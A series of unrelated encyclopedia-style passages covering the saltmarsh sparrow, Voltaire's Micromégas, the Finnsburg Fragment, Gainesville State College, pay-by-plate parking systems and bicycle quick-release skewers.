A. caudacutus diversus, breeds in Maryland and Virginia. A. c. diversus has more contrasting striping on its back and a darker crown than A. c. caudacutus.  Habitat and Distribution  The saltmarsh sparrow is only found in tidal salt marshes along the Atlantic coast of the United States. It breeds along the northern coast, from Maine to the Chesapeake Bay, and winters along the southern coast, from North Carolina to Florida. The saltmarsh sparrow prefers high marsh habitat, dominated by saltmeadow cordgrass (Spartina patens) and saltmarsh rush (Juncus gerardii), which does not flood as frequently as low marsh.  Behavior  = Vocalizations = Only males sing. The song is a complex series of raspy, barely audible buzzes, trills, and gurgles. It is distinguishable from that of the Nelson's sparrow, which is a louder, hissing buzz followed by a buzzy chip. The high-pitched contact calls of both species are indistinguishable. = Diet = The saltmarsh sparrow forages on the ground along tidal channels or in marsh vegetation, sometimes probing in the mud at low tide. Over 80% of its diet consists of flies, amphipods, grasshoppers, and moths, especially larval, pupal, and adult soldier flies. During the winter, it also eats seeds. The saltmarsh sparrow is an opportunistic feeder and food is rarely limiting. = Reproduction = A newly hatched saltmarsh sparrow and eggs in nest Saltmarsh sparrow chick Saltmarsh sparrows are non-territorial and have large overlapping home ranges. Male home ranges are twice as large as those of females and may span 50 ha (124 ac). Saltmarsh sparrows are promiscuous, and the majority of broods exhibit mixed parentage. During the nesting season, males roam long distances chasing and mounting females regardless of receptivity. Only females exhibit parental care, building the nest, incubating the eggs, and providing food to the young. The nest is an open cup constructed of grass, usually attached to saltmeadow cordgrass (Spartina patens) or saltmarsh rush (Juncus gerardii) at a height of 6‚Äì15 cm (2.4‚Äì5.9 in). Clutch size is 3 to 5. Incubation begins after the last egg is laid and takes 11‚Äì12 days. Young fledge 8‚Äì11 days after hatching but remain dependent on the mother for an additional 15‚Äì20 days. The primary cause of nest mortality is flooding due to storm surges and periodic, exceptionally high spring tides which occur every 28 days during the new moon. The saltmarsh sparrow exhibits several adaptations to flooding, including nest repair, egg retrieval, rapid re-nesting, and synchronization of breeding with the lunar cycle. Nesting begins immediately following a spring tide, allowing young to fledge before the next spring tide. Two broods are typically raised per breeding season.  Conservation status  The saltmarsh sparrow is of high conservation concern due to habitat loss resulting in small fragmented populations. Salt marshes are one of the most threatened habitats worldwide due to their limited natural extent, long history of human modification, and anticipated sea level rise. The spread of the invasive reed Phragmites has also contributed to habitat loss. The saltmarsh sparrow is very sensitive to sea level rise because of the role of flooding in nest mortality. In addition, the saltmarsh sparrow is particularly susceptible to mercury bioaccumulation, but the effects of this on survival are unclear. Saltmarsh sparrow populations declined between 5% and 9% per year between the 1990s and 2010s, resulting in a total decline of over 75%. Without management intervention, the saltmarsh sparrow is projected to become extinct by 2050. The saltmarsh sparrow was listed on the 2016 State of North America's Birds Watch List with a concern score of 19 out of 20, and the U.S. Fish and Wildlife Service is currently undertaking a status review to determine whether the species should be listed under the Endangered Species Act. Its total population was estimated to be 53,000 in 2016. References Further reading =Book= Greenlaw, J. S. and J. D. Rising. 1994. Sharp-tailed Sparrow (Ammodramus caudacutus).

Along with his story \\"Plato's Dream\\", it is an early example in the literary genre of science fiction, and is a significant development in the history of literature. The tale recounts the visit to Earth of a being from a planet circling the star Sirius, and of his companion from the planet Saturn. The technique of using an outsider to comment on aspects of Western culture was popular in this period; Voltaire also used it in Zadig. Montesquieu, too, applied it in Persian Letters, as did Jos√© Cadalso in Cartas marruecas and Tom√°s Ant√¥nio Gonzaga in Cartas Chilenas. Plot The story is organized into seven brief chapters. The first describes Microm√©gas (whose name literally means \\"small-large\\"), an inhabitant of one of the planets that orbits Sirius. His home world is 21.6 million times greater in circumference than Earth. Microm√©gas stands tall. When he is almost 450 years old, approaching the end of his infancy, Microm√©gas writes a scientific book examining the insects on his planet, which at are too small to be detected by ordinary microscopes. This book is considered heresy, and after a 200-year trial, he is banished from the court for a term of 800 years. Microm√©gas takes this as an incentive to travel around the Universe in a quest to develop his intellect and his spirit. After extensive celestial travels he arrives on Saturn, where he befriends the secretary of the Academy of Saturn, a man less than a twentieth of his size (a \\"dwarf\\" standing only tall). They discuss the differences between their planets. The Saturnian has 72 senses while the Sirian has 1,000. The Saturnian lives for 15,000 Earth years while the Sirian lives for 10.5 million years; Microm√©gas reports that he has visited worlds where people live much longer than this, but still consider their lifespans too short. At the end of their conversation, they decide to take a philosophical journey together. Eventually, they arrive on Earth and circumnavigate it in 36 hours, with the Saturnian only getting his lower legs wet in the deepest ocean and the Sirian barely wetting his ankles. They decide that the planet must be devoid of life, since it is too small for them to see with the naked eye. In the Baltic Sea, the Saturnian happens to spot a tiny speck swimming about, and he picks it up to discover that it is a whale. As they examine it, a boatful of philosophers returning from an Arctic voyage happens to run aground nearby. The space travellers examine the boat and, upon discovering the lifeforms inside it, they conclude that the tiny beings are too small to be of any intelligence or spirit. Yet they gradually realize the beings are speaking to each other, and they devise a hearing tube with the clippings of their fingernails in order to hear the tiny voices. After listening for a while, they learn the human language and begin a conversation, wherein they are shocked to discover the breadth of the human intellect. The final chapter sees the humans testing the philosophies of Aristotle, Descartes, Malebranche, Leibniz and Locke against the travellers' wisdom. When the travellers hear the theory of Aquinas that the universe was made uniquely for mankind, they fall into an enormous fit of laughter. Taking pity on the humans, the Sirian decides to write them a book that will explain the point of everything to them. When the volume is presented to the French Academy of Sciences, the secretary opens the book only to find blank pages.

The surviving text is tantalisingly brief and allusive, but comparison with other references in Old English poetry, notably Beowulf (c. 1000 AD), suggests that it deals with a conflict between Danes and Frisians in Migration-Age Frisia (400 to 800 AD). Transmission The extant text is a transcript of a loose manuscript folio that was once kept at Lambeth Palace, the London residence of the Archbishops of Canterbury. This manuscript was almost certainly Lambeth Library MS 487. A British scholar, George Hickes, made the transcript some time in the late 17th century, and published it in an anthology of Anglo-Saxon and other antiquities in 1705.Hickes, Linguarum. Veterum Septentrionalium Thesaurus grammatico-criticus et archaeologicus, vol 2 (Oxford, 1705). (This anthology also contains the first reference to the sole manuscript of Beowulf.) Since the time when the copy was made the original manuscript folio has been lost or stolen. Synopsis The fragment is only about 50 lines long and does not specify the tribal identities of those involved. It describes a battle in which Hn√¶f (lines 2 and 40), elsewhere known as a Danish prince (see below), is attacked at a place called Finnsburuh \\"Finn's stronghold\\" (line 36). To judge by Beowulf, this is apparently the hall of his brother-in-law Finn, ruler of the Frisians, where he has come to spend the winter (see below). The fragment begins with Hn√¶f's observation that what he sees outside \\"is not the dawn in the East, nor is it the flight of a dragon, nor are the gables burning\\". What he sees is the torches of approaching attackers. Hn√¶f and his sixty retainers hold the doors for five days, without any falling. Then a wounded warrior turns away to talk to his chief (it is not clear on which side) and the fragment ends. Neither the cause nor the outcome of the fight are described; KlaeberKlaeber, Frederick. Klaeber's Beowulf. Fourth Edition. Toronto: University of Toronto Press, 2008. has the races of the vying parties as the Danes and the Frisians (the terms Frisians and Jutes are used interchangeably throughout this work). Tolkien, on the other hand, treated the Jutes as an entirely separate ethnic group and proposed his \\"Jutes-on-both-sides\\" theory, which states that the very reason for the conflict was the presence of Jutes (alongside the respective \\"native\\" retainers in both groups) in the retinues of both Finn and Hn√¶f (or, more specifically, that of Hn√¶f's thegn Hengest), and that these Jutes were hostile to one another.Tolkien, J.R.R. Finn and Hengest: The Fragment and the Episode. Boston: Houghton Mifflin, 1983. Battle according to Beowulf The context for the poem is obscure, but a version of the story also appears in a passage of the epic poem Beowulf, and some of the characters, such as Hn√¶f, are mentioned in other texts. The episode in Beowulf (lines 1068‚Äì1158) is about 90 lines long and appears in the form of a lay sung by Hrothgar's scop at a feast in celebration of Beowulf's recent exploit. The lay identifies Hn√¶f's last struggle as the aftermath of a battle described as Fres-w√¶l (\\"Frisian slaughter\\"). The episode is allusive and is clearly intended for an audience that already knows the story.Fulk, \\"Six Cruces in the Finnsburg Fragment and Episode\\", . It describes the mourning of Hildeburh after a surprise attack by the Frisians on the Danes. Hildeburh, Hn√¶f's sister, was married to Finn, leader of the Frisians, in an effort to make peace between the two tribes though this attempt was unsuccessful and today is seen by many scholars as the source for tragedy in the piece.Camargo, \\"The Finn Episode and the Tragedy of Revenge in Beowulf\\", She mourned for the loss of her brother, Hn√¶f, whose funeral pyre was shared by the son of herself and Finn. After the battle, Finn and a character named Hengest make a loyalty pact. Hengest is a leader among Hn√¶f's surviving warriors.Liuzza, \\"Beowulf.\\" The circumstances are obscure, but Hn√¶f's men are to stay in Finnesburgh, at least for the winter, and the Frisians are not to taunt them for following the slayer of their lord. In the end, Hengest is overcome by vengeance and slaughters Finn and his men in their own mead hall. He then loots the hall and takes Hildeburh back \\"to her people\\". From the first glance we see many differences between the Finn Episode in Beowulf and the Finnsburg Fragment. One of the first and most prevalent differences is the absence of Hildeburh from the Finnsburgh Fragment. In the Finn Episode she is an integral character, one that is affected by all action of the piece, some would even consider her to be a tragic character for this very reason.Camargo, \\"The Finn Episode and the Tragedy of Revenge in Beowulf\\", p. From the beginning of the story she is in mourning at the loss of her brother, Hn√¶f, and her sons along with many Danes to whom she owed blood loyalty, and Frisians, to whom she owed loyalty through marriage.Albano, \\"The role of women in Anglo-Saxon culture: Hildeburh in Beowulf and a curious counterpart in the Volsunga Saga\\", pp. 1‚Äì10. Some view Hildeburh's marriage as one of obligation, not one of love; she was not tied so strongly to Finn or the Frisians. She is a character that is heavily debated upon by critics and scholars who argue that she is either heavily romanticized, or an extremely sympathetic character. The view of Hildeburh as a tragic or romanticized character is often viewed by scholars as being an \\"unconvincing assessment\\" because of its ‚Äúlack of textual proof and emotional tenor‚Äù and because it often fails to take into account the vast difference in time and culture between modern and Anglo-Saxon audiences. Her importance to the storyline in the Finn Episode makes her absence from the Finnsburgh Fragment all the more obvious. This is also true of Hengest. In the Finn Episode Hengest plays an extremely important role in the way the story plays out. He is a leader and instigates much of the action seen in the piece. Hengest is the character that ‚Äúpledged‚Äù a ‚Äúfirm compact of peace‚Äù with the Frisians and killed Finn \\"in his own home\\". As with Hildeburh, his importance to the action in the Finn Episode makes his lack of mention in the Finnsburg Fragment all the more obvious. He is only seen once in the fragment and that mention is not one in which he represents an important role. His action in the piece does not represent that of a leader; instead he is simply mentioned in line 17 which reads that Hengest himself stepped in afterwards (\\"and Hengest sylf / hwearf him on laste\\"). This reading, it can be argued, does put emphasis on Hengest's presence at the battle; however, it does not put him in a position of power as he is in The Finn Episode. Scholarly reception J. R. R. Tolkien made a study of the surviving texts in an attempt to reconstruct what may have been the original story behind the Finnesburg Fragment and the \\"Finnesburg Episode\\" of Beowulf'. This study was eventually edited into the book Finn and Hengest. Tolkien argues there that the story is historical, rather than legendary, in character. Tolkien also argues that Finnsburuh is most likely an error by either Hickes or his printer, since that construction appears nowhere else, and the word should be Finnesburh.Tolkien and Bliss, Finn and Hengest: The Fragment and the Episode. It is not clear whether this was the actual name of the hall or only the poet's description of it. Where exactly the hall was, or even whether it was in Frisia, is not known. Uniquely in the surviving Old English corpus, the fragment contains no Christian references and the burning of Hn√¶f is clearly pagan. Religious elements Though the Finnesburg Fragment itself has little mention of religious elements, the text of Beowulf does. In recent times several critics have offered explanations for the Christian elements of the poem. Christopher M. Cain specifically suggests that the author was Christian and wrote the poem with parallels to the Old Testament to show the pre-Christian world in which the epic takes place.Cain, \\"Beowulf, the Old Testament, and the Regula Fidei.\\" This unique approach highlights the fact that the characters such as Beowulf and Hrothgar act in a way that is still moral without being explicitly Christian. In contrast C. Tidmarsh Major took a different approach and examined the state of religion at the time the poem was likely written. In the Middle Ages he asserts that Christianity was not at all as uniform as it is now, and neither was Germanic paganism.Major, \\"A Christian Wyrd: Syncretism in Beowulf\\", . In fact he simply argues that it is a literary example of the overlapping and melding of pagan and Christian beliefs as they encountered one another.

Classes were first held in the fall of 1966, with an enrollment of 419 students, and the school utilized facilities at the Gainesville Civic Center and First Baptist Church of Gainesville. The school moved into its own dedicated facilities beginning in the winter of 1967. The initial enrollment was approximately double what had been projected, and the school continued to enroll more students than had been projected by long-range studies, necessitating a tripling of educational facilities during the College‚Äôs early years. In 1987, the school's name was changed to Gainesville College. In the fall of 2000, the Georgia Board of Regents granted then-Gainesville College permission to establish the Gainesville College University Center on the Gainesville campus. The University Center enabled the College to form partnerships with other baccalaureate degree granting institutions to provide coursework leading to the bachelor's degree on the Gainesville campus. In October 2005, the Board of Regents voted to expand the school's mission and change its name to Gainesville State College. The school was reclassified as a four-year state college, which allowed it to begin offering a limited selection of baccalaureate degrees. The first four-year degree offered by the school was a Bachelor of Science in Applied Environmental Spatial Analysis, and the selection of four-year degrees offered has expanded through the years. In the spring of 2001, the school was granted permission to open a second campus in Athens, Georgia. This site was opened in the fall of 2001 and was relocated in 2003 to a nearby site in Watkinsville, Oconee County, Georgia. The Oconee campus was expanded in 2009 with the addition of an 11,000 square foot multipurpose Faculty Center. Enrollment growth in later years (to 8,800 students in 2009, with 6,597 enrolled at the Gainesville campus) resulted in the construction and renovation of several buildings, bringing the total number of buildings at the Gainesville campus to thirteen. The most recent major addition was a building devoted to science, engineering, and technology. Academics With an enrollment which exceeded 8,000 in 2011, Gainesville State College offered courses leading to the Bachelor of Science in Applied Environmental Spatial Analysis (IESA - Institute for Environmental and Spatial Analysis), Bachelor of Science with a Major in Early Childhood Care and Education, Bachelor of Applied Science with a Major in Technology Management, Associate of Arts, Associate of Science, and Associate of Applied Science degrees, in addition to certificate programs in Information Technology, Geographic Information Systems and Personal Fitness Training. Ninety percent of Gainesville State College students were in programs transferable to four- year colleges and universities. North Georgia College and State University offered courses on the Gainesville campus through the College‚Äôs University Center. Student life Gainesville State College students could participate in student activities such as intramurals, clubs and organizations, bands, chorus, publications, cultural affairs programs, fine arts offerings, extended orientation, and international-intercultural studies programs. To promote student involvement in extra-curricular activities, the college offered co- curricular transcripts for use in job and academic applications. The Gainesville State College Foundation generated and administered private financial support for the college, primarily for student scholarships, faculty and staff development, and outreach activities of the College. Graduates of the college could join the Gainesville State College Alumni Association. The college Continuing Education Department supports professional and vocational interests of area citizens and reflects a lifelong learning philosophy of the institution. Gainesville State College, in partnership with Brenau University, was a member of the Gainesville Theatre Alliance (GTA) which produced three to four plays or musicals each year. Items such as notebooks and sweatshirts in the GSC bookstore were branded with \\"Home of the Fighting Geese\\" and Laker T. Goose mascots. Those images were intended only to effect school spirit, because GSC did not field intercollegiate or extramural athletic teams.  Faculty From 2008 data, GSC faculty included 87 holders of doctorates (46.3%), 3 holders of professional degrees (1.6%), 92 holders of master's degrees (48.9%), and 6 holders of bachelor's degrees (3.2%). According to the latest data available from 2006, GSC had 140 full-time faculty, 133 part-time faculty, and 66 faculty members classified as \\"Other\\". In 2008, 97 faculty members were male (51.6%) and 91 were female (48.4%). Under racial classifications, 12 faculty members were classified as \\"Black\\" (6.4%), 149 faculty members were classified as \\"White\\" (79.3%), and 27 faculty members were classified as \\"Other\\" (14.4%). Despite the uniformity of tuition among seven of the University System of Georgia's eight state colleges,http://www.usg.edu/fiscal_affairs/budget/tf/fy11/FY2011_Tuition_Rates.pdf Gainesville State College's faculty pay ranksed at the bottom for associate professors ($55,323 USG vs. $48,161 GSC - 12.9% lower), assistant professors ($46,818 USG vs. $39,524 GSC - 15.6% lower), and instructors ($39,160 USG vs. $35,342 GSC - 9.7% lower). While full professors at GSC were not the lowest paid out of all of the state colleges, they were still paid 10.3% below the state college average. In 2008, faculty members by rank included 34 full professors (18.1%), 38 associate professors (20.2%), 85 assistant professors (45.2%), and 31 instructors (16.5%). That same year, 74 faculty were tenured (39.4%), 91 were tenure track (48.4%), 9 were non-tenure track (4.8%), and 14 were not on tenure track (7.4%). The data gives no indication on the precise difference between \\"non-tenure track\\" and \\"not on tenure track\\".

They enable customers to purchase parking time by using their license plate number. The machines print a receipt that generally displays the location, machine number, start time, expiration time, amount paid, and license plate. Principles The pay by plate system services multiple vehicles by making the driver input the license plate information into a machine. This system results in lower set up costs, maintenance, and prevents drivers from taking advantage of parking meters that have time remaining. In many cities, pay by plate has replaced the road-side parking meter and the pay and display machines. The advantage to the city could be: increased revenue, increased compliance, less disputed tickets, increased parking space utilization and/or reduction in staff [see Results section]. The advantage to the driver is that the vehicle could be moved to another parking spot and still have a paid status compared to other systems. Previously with parking meters and pay by space, the payment did not follow the driver which resulted in a parking ticket if they decided to move spaces. In addition to this advantage, the driver could also purchase time by phone so that the driver does not have to go back to the machine to extend their parking session. The pay by plate machines accept coins, credit cards, debit cards and NFC for smart phone payments, making it unnecessary for drivers to carry large amounts of change. The use of debit cards, credit cards and NFC are also advantageous to the city as they do not have to empty the machines as often lowering the cost of maintenance. It can also help to limit pilfering by employees who empty the parking meters. = Enforcement = Enforcement of license plates is done in one of three ways: by manual plate entry into a handheld device, by Automated License Plate Recognition (ALPR) in a handheld device or by vehicle mounted ALPR. The enforcement officer enters the plate manually or automatically depending on the technology used, and the system looks up payment information to see if the vehicle is parked legally. Illegally parked vehicles are issued a citation in real-time on the windshield or through a post-processed mail out method. Payments are retrieved from multiple sources from phone payments to on street payment machines. This process allows the parking enforcement officer to quickly determine who has and has not paid resulting in larger revenues for the city through citations and/or compliance.  Hand Held  Manual hand held devices look up the plate that the user manually enters. This method is prone to human error for data entry and has no photographic evidence to save (without separately taking a photo). Hand held ALPR comes in two flavors: ones that take single shot pictures to run ALPR against, and ones that run the camera in video mode performing ALPR on the stream of images. The single shot method takes longer but the full resolution of the camera is at its disposal. The live video mode is limited to the resolution of the video stream but has the advantage of running multiple images from subtly different angles. To date there has been no study as to which method results in the best ALPR read on a handheld device but arguments could be made for and against both. Handheld devices have the advantage over vehicle mounted systems of being cheaper and able to enforce vehicles in tight spaces that an enforcement vehicle could not reach. There are also states and provinces that only have a license plate on the rear of the vehicle, making vehicle mounted ALPR impossible on vehicles that are backed into a parking space. However, handheld systems cannot match the efficiency of a vehicle mounted ALPR system travelling upwards of 60 km/h.  Vehicle Mounted ALPR  See main article: Automatic number plate recognition In mobile systems. As it pertains to pay by plate, the payments are either pushed or pulled from a web service so that the enforcement vehicle always has up to date payment information. ALPR enabled parking enforcement vehicles typically travel at speeds upwards of 60 km/h all the while checking multiple license plates per second and verifying payment. Handheld systems cannot match the efficiency of this, however vehicle mounted ALPR systems are typically a magnitude more expensive. As mentioned before, vehicle mounted ALPR systems are not suited for all areas where an enforcement vehicle cannot \\"see\\" the license plate due to parking angle, plate placement, road geometry, etc. In those areas, handhelds are the best option. Installations In Canada, the first pay-by-plate system was unveiled in Calgary, AB on September 20, 2007. This was a system commissioned by the Calgary Parking Authority using CALE pay machines, Tannery Creek Systems autoChalk enforcement technology, and MTS Allstream for pay by cellphone and was branded under the ParkPlus banner. For their efforts, the ParkPlus system was awarded the 2009 Institute of Transportation Engineers (ITE) Best Practices Award. Whistler, BC followed suit on July 12, 2010 unveiling its Pay by Plate system consisting of CALE pay machines, and gtechna enforcement technology. Since the ParkPlus system issues mailout tickets it is not considered \\"real-time\\", thus the Whistler installation is the first real-time system in Canada. However, in late 2015, the Calgary Parking Authority unveiled a new system for issuing tickets in real time at the street level using hand-held tablets and portable printers that access the pay-by-plate information in the ParkPlus system. In the USA, the first pay-by-plate system to go live with real-time enforcement was in Denver Colorado. On February 2008, the Regional Transportation District rolled out a system consisting of MacKay Meters, MacKay Guardian Multi pay stations and Federal APD PIPS mobile LPR enforcement system. The system features optional receipts that consumers don't need to put on their dash and vehicle mounted ALPR at speeds up to 30 mph for enforcement. The largest Pay- By-Plate parking system in the world was installed by Global Parking Solutions (GPS) for Brisbane City Council in Brisbane, Australia, in 2009.Global Parking Solutions case studies http://www.globalparkingsolutions.com/case-studies/ GPS supplied and installed more than 1000 Metropolis Pay-by-Plate terminals for Brisbane City Council and also custom-built a comprehensive parking system, including enforcement, Pay-by-Phone, central management system, credit card transactions, and more. The solution cost 33% less than allocated capex budget and reduced opex by 33%. The system has the potential to integrate other technologies such as Pay by Phone and reduce the number of terminals. Global Parking Solutions Metropolis Pay-By-Plate terminal While Norwalk, CT launched their plate enabled permit system on March 25, 2011, it was not a true pay-by- plate system as it utilized parking permits instead and takes a pay-by-space approach. It was a project managed and driven by LAZ Parking utilizing the gtechna Permit System, Cale pay by space pay stations, ParkMobile pay by phone system, and gtechna Officer Plate system. The only piece missing to make this a complete plate processing solution, is the parking terminal. With no parking terminal and pay by space, this breaks the plate enforcement efficiency in the field. Washington, DC has done some trial tests with Pay by Plate (Fall 2010), and will probably proceed with this technology. As of May 2014, Washington, DC the only component available for the \\"parker\\" to pay plate for parking, is with the ParkMobile mobile system. Pittsburgh, PA is implementing the largest Pay-by-Plate parking terminal project in the USA. This project has started on July 26, 2012. As of January 2013, Pittsburgh Parking Authority has completed the installation of 550+ Pay-by-Plate parking terminals. Every Parking Terminal is modem enabled, and is transmigrating all payments for parking in real-time. All the parking officers (PEO's) in Pittsburgh, and using Honneywell 9900 mobile hand held computers to enforce the \\"parkers\\" vehicle plate. This technology is also installed in all off-street lots within the City of Pittsburgh. The enforcement solution provider in Pittsburgh, PA is gtechna corporation. This will be the largest USA pay-by-plate campaign to date. For Pittsburgh, PA the Parking Authority has now (Sept 2014) installed 800+ pay by plate parking terminals. These terminals generate over 25,000 transactions per day for on-street and off-street parking. The technology used for terminals supplied by CALE America and to enforce / verify the plate it is an Android smartphone & Officer eTicket software provided by gtechna. Mr. Mastronardi CTO of gtechna, is watching the pay by plate at Pittsburgh very closely since it requires extreme tight integration with the meter and pay by phone suppliers. Parkmobile pay by phone solution has been installed in Pittsburgh, allowing the \\"parkers\\" to have full use of the pay by plate solution within a city with 2 technologies. The challenges remain on the enforcement side, and gtechna has implemented a centralized parking rights gateway allowing the process of all \\"parkers\\" data to be captured in 1 server.  Results  = ParkPlus/Calgary, Alberta = The ParkPlus System in Calgary, Alberta has seen the following benefits: * 15% increase in net operating revenue * Payment compliance improved by 19% * 60% less disputed tickets * Curbside parking space utilization increased by 10% * 38% reduction in enforcement staff = Pittsburgh, Pennsylvania = In Pittsburgh, Pennsylvania the following results were achieved: * Revenue tripled from 2011's $5.5 million to 2015's $17.1 million. An increase of 211%.

It consists of a rod threaded on one end and with a lever operated cam assembly on the other. The rod is inserted into the hollow axle of the wheel, a special nut is threaded on, and the lever is closed to tighten the cam and secure the wheel to the fork. Wheels equipped with quick release mechanisms can be removed from the bicycle frame and replaced without using tools by opening and closing the cam lever, thus more quickly than wheels with solid axles and nuts. On the negative side, a quick-release hub renders a wheel more vulnerable to theft and care must be taken to ensure that the mechanism is properly tightened. Similar quick- release mechanisms are also used to operate seatpost clamps, and the collapsing stem of folding bicycles and kick scooters. History The mechanism was invented in 1927 by Tullio Campagnolo, an Italian bicycle racer. He was frustrated when he attempted to change gears during a race. At the time there was but one cog on each side of the rear hub, so gear changes necessitated stopping, removing the rear wheel, flipping it over horizontally so that the opposite cog is engaged by the chain, and finally reinstalling the wheel. The weather had turned cold, and his hands were numb, so he could not operate the wingnuts which retained the wheel. He had been well-placed prior to the gear change, but lost valuable time. This prompted him to develop the quick release. Another Campagnolo invention that made use of the quick-release mechanism was the Cambio Corsa, a multi-gear changing system consisting of a rear wheel quick-release lever with a mechanical extension that placed the lever itself near the bicycle's saddle, combined with a fork that served as a primitive version of a rear derailleur (without idler pulleys to take up slack), that also had a control lever near the bicycle saddle. This innovation enabled bicycle riders quickly to change gears while in motion by releasing the axle, moving the rear wheel slightly forward by applying tension to the chain, actuating the fork to change to a larger sprocket, and tightening the quick release again; or else releasing the axle, actuating the fork to change to a smaller sprocket, moving the wheel slightly rearward by braking, and tightening the quick release again. The quick-release mechanism, along with other innovations and high standards of manufacture, enabled Campagnolo to become a leading road cycling and track cycling component manufacturer. Usage Quick releases tend not to be used on certain types of bicycles, such as utility bicycles (with a single speed or hub gears) or track bicycles, partly because of tradition and partly because there is less need for quick removal of wheels without using tools. Quick releases are sometimes recommended against with the use of disc brakes because of the need for the axle attachment to withstand braking forces. Skewers of French origin differed in threading, as all other specifications of a French bicycle once were, as they were based on the Metric System. Despite modern measurements for bicycles being given in metric units, they are based on the United States Customary System (derived from English Units), ie, 28.6‚âà1 1/8. Over the years quick release mechanisms have been adopted as the primary wheel release devices by the average rider. However, as Sheldon Brown (bicycle mechanic) notes this change has come with some difficulty: The debate over quick release use as illustrated by Brown, has become a national issue due to several lawsuits brought on by various people including a group of mothers who claim their children were injured due to innocently incorrect use of quick releases. The quick-release levers are usually on the left side of the bike, though some prefer to have them on the right if a disc brake is on the left. Mountain bikers often prefer to point the lever backwards, to reduce the risk of it catching on undergrowth and being pulled open.Bicycling Life Lever points rearward Variations Locking skewers use specially-shaped nut/bolt to protect various parts of a bicycle Locking skewers are available without handles or with specialty removable handles in order to deter wheel theft.
